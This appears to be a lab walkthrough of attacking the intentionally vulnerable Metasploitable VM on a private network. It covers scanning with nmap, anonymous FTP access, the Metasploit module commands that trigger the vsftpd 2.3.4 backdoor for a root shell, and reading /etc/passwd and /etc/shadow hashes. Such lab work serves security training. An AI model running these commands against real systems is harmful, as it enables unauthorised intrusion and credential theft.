### Step 2 — Reconnaissance & Scanning

### Network discovery
- Kali IP: 10.0.2.15
- Metasploitable IP: 10.0.2.4
- Tool used: arp-scan -l

### Port scan results (nmap -sV 10.0.2.4)
- 21/tcp  vsftpd 2.3.4  → VULNERABLE (CVE-2011-2523)
- 22/tcp  OpenSSH 4.7p1
- 23/tcp  Telnet
- 80/tcp  Apache 2.2.8
- 1524    bindshell (open root shell)
- 3306    MySQL
- Total: 22 open ports

### Interpretation
Metasploitable has an abnormally large number of open ports.
The FTP service runs vsftpd 2.3.4 which contains a known backdoor.
This will be our exploitation target.

## Step 3 — FTP Enumeration (Port 21)

### Command used
nmap --script ftp-anon,ftp-syst -p 21 10.0.2.4

### Findings
1. Anonymous FTP login: ALLOWED (code 230)
   - Anyone can connect without credentials
   - Severity: HIGH

2. FTP version: vsftpd 2.3.4
   - Known backdoor: CVE-2011-2523
   - Severity: CRITICAL

3. Connections are plain text (unencrypted)
   - Credentials visible on network
   - Severity: MEDIUM

### Manual verification
- Connected with: ftp 10.0.2.4
- Username: anonymous / Password: anything
- Result: 230 Login successful


## Step 4 — Exploitation

### Tool: Metasploit Framework
### Module: exploit/unix/ftp/vsftpd_234_backdoor
### CVE: CVE-2011-2523

### Commands used
- use exploit/unix/ftp/vsftpd_234_backdoor
- set RHOSTS 10.0.2.4
- run

### Result
- Backdoor triggered on port 6200
- Root shell obtained immediately
- Session: 10.0.2.15:46565 -> 10.0.2.4:6200
- No credentials required

## Step 5 — Post-Exploitation

### System info
- OS: Linux metasploitable 2.6.24 (2008 kernel)
- Hostname: metasploitable
- Current user: root (uid=0)

### Findings
1. /etc/passwd readable — 30+ accounts listed
   Real users: msfadmin, user, service, postgres

2. /etc/shadow readable — password hashes exposed
   root, msfadmin, user, service all have crackable hashes
   Severity: CRITICAL

3. Home directories: ftp, msfadmin, service, user

4. Target IP confirmed: 10.0.2.4
